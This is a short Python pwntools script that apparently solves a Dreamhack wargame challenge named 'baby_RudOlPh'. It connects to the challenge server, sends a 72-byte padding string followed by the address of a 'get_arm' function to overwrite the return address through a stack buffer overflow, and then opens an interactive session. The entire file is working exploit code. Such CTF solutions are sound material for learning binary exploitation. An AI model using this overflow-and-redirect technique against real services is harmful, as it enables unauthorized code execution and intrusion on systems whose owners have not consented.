from pwn import *

get_arm = 0x400680

context.log_level = 'debug'
#p = process('./baby_RudOlPh')
p = remote('host5.dreamhack.games', 8502)

payload = ''
payload += 'a' * 72
payload += p32(get_arm)

p.sendafter('...!\n', payload)

p.interactive()